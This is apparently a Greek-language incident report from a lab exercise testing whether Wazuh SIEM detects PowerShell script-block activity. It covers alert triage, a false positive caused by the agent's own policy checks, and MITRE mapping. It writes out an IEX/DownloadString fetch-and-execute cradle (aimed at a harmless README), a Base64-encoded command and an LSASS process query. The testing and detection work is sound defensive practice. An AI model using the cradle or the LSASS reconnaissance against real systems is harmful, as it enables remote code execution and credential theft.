# INC-002: Ύποπτη Εκτέλεση PowerShell στο WIN11-VICTIM

## Σύνοψη

| Πεδίο | Τιμή |
|---|---|
| **Αναγνωριστικό Περιστατικού** | INC-002 |
| **Ημερομηνία εντοπισμού** | 2026-10-19 |
| **Σοβαρότητα** | Χαμηλή |
| **Κατάσταση** | Επιλύθηκε (προσομοίωση σε lab) |
| **Εντοπίστηκε από** | Wazuh SIEM (PowerShell Script Block Logging, Event ID 4104) |
| **Αναλυτής** | Harry Kotsis |

## Εντοπισμός

Τρεις εντολές PowerShell, συνηθισμένες σε σενάρια αναγνώρισης (reconnaissance) και αποφυγής ανίχνευσης (defense evasion), εκτελέστηκαν τοπικά στο μηχάνημα-θύμα, με σκοπό να δοκιμαστεί αν ο Wazuh agent μπορεί να καταγράψει και να αναλύσει το πλήρες περιεχόμενο ενός PowerShell script block (και όχι απλώς το γεγονός ότι εκτελέστηκε το `powershell.exe`).

- **Μηχανισμός εντοπισμού:** PowerShell Script Block Logging (Event ID 4104), το οποίο ενσωματώθηκε μέσω προσαρμοσμένης καταχώρησης `<localfile>` στις ρυθμίσεις του Wazuh agent (κανάλι `Microsoft-Windows-PowerShell/Operational`), που **δεν είναι ενεργοποιημένο εξ ορισμού** στο βασικό config του Wazuh Windows agent.
- **Κανόνας που ενεργοποιήθηκε από τη δοκιμή:** 91815 — *"Powershell executing process discovery"*

## Πηγή και Στόχος

| Ρόλος | Hostname | Διεύθυνση IP |
|---|---|---|
| **Μηχάνημα** | WIN11-VICTIM | 192.168.56.20 |
| **Εκτελέστηκε από** | τοπικό χρήστη (`vboxuser`) | — |

## Εντολές που Εκτελέστηκαν (Σύνολο Δοκιμής)

1. **Κωδικοποιημένη εντολή σε Base64** (κλασικό μοτίβο απόκρυψης/αποφυγής εντοπισμού):
   ```
   powershell.exe -EncodedCommand "RwBlAHQALQBQAHIAbwBjAGUAcwBzAA=="
   ```
   Αποκωδικοποιήθηκε και καταγράφηκε από το Wazuh σε απλό κείμενο ως: `Get-Process`

2. **Download cradle** (κλασικό μοτίβο "λήψη και εκτέλεση"):
   ```
   IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShell/PowerShell/master/README.md')
   ```
   Έκανε λήψη ενός αβλαβούς αρχείου Markdown από το GitHub και προσπάθησε να εκτελέσει το περιεχόμενό του ως PowerShell, κάτι που απέτυχε με σφάλματα parser (το αρχείο δεν είναι έγκυρο PowerShell syntax). Η εντολή παρ' όλα αυτά προκάλεσε δικτυακή δραστηριότητα και μοτίβο `IEX`/`DownloadString`.

3. **Ερώτημα στη διεργασία LSASS** (βήμα αναγνώρισης που συχνά προηγείται τεχνικών υποκλοπής credentials):
   ```
   Get-Process | Where-Object {$_.ProcessName -like "*lsass*"}
   ```

## Αποδεικτικά Στοιχεία

- **Rule 91815** — *"Powershell executing process discovery"*, επίπεδο κανόνα 4
  - `data.win.eventdata.scriptBlockText`: `Get-Process`
  - `rule.mitre.id`: **T1057**
  - `rule.mitre.tactic`: Discovery
  - `rule.mitre.technique`: Process Discovery

- **Screenshots:**
  - `screenshots/03-powershell-wazuh-alerts.png` — προβολή Threat Hunting, 9 συνολικά hits στο Event ID 4104
  - `screenshots/03-powershell-alert-detail-91815.png` — λεπτομέρειες του rule 91815, με το αποκωδικοποιημένο `scriptBlockText` και την αντιστοίχιση MITRE
  - `screenshots/03-powershell-alert-detail-91816-sca.png` — λεπτομέρειες του rule 91816, που αποδείχθηκε false positive (βλ. Ανάλυση)

## Ανάλυση

**Επιβεβαιωμένο εύρημα:** η κλήση με `-EncodedCommand` της εντολής `Get-Process` καταγράφηκε, αποκωδικοποιήθηκε και κατέγραψε σωστά το PowerShell Script Block Logging των Windows, και αντιστοιχίστηκε με τον κανόνα 91815 του Wazuh με ακριβή αντιστοίχιση MITRE ATT&CK (T1057 — Process Discovery). Αυτό αποδεικνύει ότι η απόκρυψη με Base64 **δεν** παρακάμπτει τον εντοπισμό εφόσον είναι ενεργό το Script Block Logging, καθώς τα Windows αποκωδικοποιούν και καταγράφουν την τελική εντολή που εκτελείται, ανεξάρτητα από το πώς είχε κωδικοποιηθεί στη γραμμή εντολών.

**Σημείωση triage για false positive (σημαντικό):** από τα συνολικά 9 hits στο Event ID 4104 που παρατηρήθηκαν στο ίδιο χρονικό παράθυρο, τα 8 αντιστοιχίστηκαν στον κανόνα 91816 (*"Powershell script querying system environment variables"*), όλα με πανομοιότυπο `scriptBlockText`:

```
secedit /export /cfg $env:TEMP\secpol.cfg; Get-Content $env:TEMP\secpol.cfg | Select-String MinimumPasswordLength; Remove-Item $env:TEMP\secpol.cfg
```

Αυτή η εντολή **δεν** εκτελέστηκε ως μέρος του συνόλου δοκιμής που περιγράφεται παραπάνω. Με βάση το χρονισμό και το περιεχόμενο, αποδίδεται στο ίδιο το module **Security Configuration Assessment (SCA)** του Wazuh agent, που εκτελεί περιοδικούς ελέγχους πολιτικής βασισμένους σε PowerShell (συμπεριλαμβανομένης της πολιτικής κωδικών, μέσω `secedit`) ως μέρος της κανονικής του λειτουργίας. Συνέπεσε τυχαία στο ίδιο παράθυρο 30 δευτερολέπτων με τη χειροκίνητη δοκιμή, κάτι που θα μπορούσε εύκολα να παρερμηνευτεί ως 8 επιπλέον γεγονότα προερχόμενα από τον επιτιθέμενο, αν δεν εξεταζόταν προσεκτικά.

Αυτό αποτελεί ένα χρήσιμο, ρεαλιστικό δίδαγμα για SOC: **ο όγκος των alerts δεν ισοδυναμεί με όγκο κακόβουλης δραστηριότητας**, και ένας αναλυτής πρέπει πάντα να εξετάζει το πραγματικό `scriptBlockText` (ή αντίστοιχο ακατέργαστο στοιχείο) πριν αποδώσει γεγονότα σε επιτιθέμενο, αντί να βασίζεται μόνο στον αριθμό alerts ή στις περιγραφές κανόνων.

Η εντολή `IEX`/`DownloadString` και το ερώτημα LSASS δεν εμφανίστηκαν ως ξεχωριστές, σαφώς αποδιδόμενες καταχωρήσεις Event ID 4104 σε αυτό το παράθυρο δοκιμής — πιθανότατα λόγω του τρόπου με τον οποίο το PowerShell διαχωρίζει/ομαδοποιεί την καταγραφή script block για σύντομες ή αποτυχημένες εκφράσεις. Αυτό σημειώνεται ως κενό προς περαιτέρω διερεύνηση (βλ. Προτεινόμενες Ενέργειες).

## Αντιστοίχιση MITRE ATT&CK

| Tactic | Technique | ID | Στοιχεία |
|---|---|---|---|
| Discovery | Process Discovery | T1057 | Rule 91815, επιβεβαιωμένο μέσω `scriptBlockText: Get-Process` |
| Command and Scripting Interpreter: PowerShell | — | T1059.001 | Γενική τεχνική για όλη την εκτέλεση PowerShell σε αυτή τη δοκιμή (χειροκίνητη αντιστοίχιση· δεν σημειώθηκε άμεσα από τον κανόνα που ενεργοποιήθηκε) |
| Credential Access (απόπειρα αναγνώρισης) | OS Credential Dumping (LSASS Memory) | T1003.001 | Χειροκίνητη αντιστοίχιση για το ερώτημα `Get-Process *lsass*`· δεν επιβεβαιώθηκε αντίστοιχο alert στο Wazuh σε αυτή τη δοκιμή |

## Προτεινόμενες Ενέργειες

1. Διατήρηση του PowerShell Script Block Logging μόνιμα ενεργοποιημένου σε όλα τα παρακολουθούμενα endpoints — αποδείχθηκε αποτελεσματικό στην αποκωδικοποίηση κρυμμένων εντολών.
2. Επιπλέον ενεργοποίηση **PowerShell Module Logging** και **Transcription**, που θα προσέφεραν περαιτέρω πλαίσιο (π.χ. ποια modules φορτώθηκαν) και ενδεχομένως θα βοηθούσαν στην καταγραφή των γεγονότων `IEX`/download-cradle και LSASS-query που δεν αντιστοιχίστηκαν σαφώς σε κανόνα σε αυτή τη δοκιμή.
3. Δημιουργία ή προσαρμογή προσαρμοσμένου κανόνα στο Wazuh για ειδική σήμανση μοτίβων `IEX`, `DownloadString`, `Net.WebClient` και `-EncodedCommand` στο `scriptBlockText`, ανεξάρτητα από το αν καταλήγουν σε κανόνα τύπου "process discovery".
4. Καθιέρωση baseline για την αναμενόμενη δραστηριότητα PowerShell του ίδιου του module SCA του Wazuh (π.χ. έλεγχοι πολιτικής μέσω `secedit`), ώστε οι αναλυτές να μπορούν γρήγορα να διακρίνουν τηλεμετρία που παράγεται από τον agent από τηλεμετρία που παράγεται από επιτιθέμενο κατά το triage.
5. Παρακολούθηση της "γενεαλογίας" διεργασιών (parent/child process) γύρω από ερωτήματα στο `lsass.exe`, καθώς η επαναλαμβανόμενη ή scripted απαρίθμηση του LSASS αποτελεί πρόδρομο εργαλείων υποκλοπής credentials όπως το Mimikatz.

## Διδάγματα (Σημειώσεις Lab)

- Το βασικό config του Wazuh Windows agent **δεν** παρακολουθεί εξ ορισμού το κανάλι `Microsoft-Windows-PowerShell/Operational`· χρειάστηκε να προστεθεί χειροκίνητα μέσω block `<localfile>` στο `ossec.conf`, ακολουθούμενο από επανεκκίνηση της υπηρεσίας `WazuhSvc`.
- Οι πολιτικές καταγραφής PowerShell βασισμένες σε registry (`EnableScriptBlockLogging`) ενεργοποιούνται μόνο για **νέες** διεργασίες PowerShell που ξεκινούν μετά την αλλαγή· προηγουμένως τρέχουσες ή ήδη εκτελεσμένες εντολές δεν καταγράφονται αναδρομικά.
- Δεν είναι κάθε alert σε ένα χρονικό παράθυρο "ύποπτου PowerShell" απαραίτητα προερχόμενο από επιτιθέμενο — το ίδιο το module SCA του Wazuh agent παράγει τη δική του τηλεμετρία βασισμένη σε PowerShell, η οποία πρέπει να εξαιρείται κατά την ανάλυση ώστε να μην διογκώνεται η αντιληπτή έκταση ενός περιστατικού.
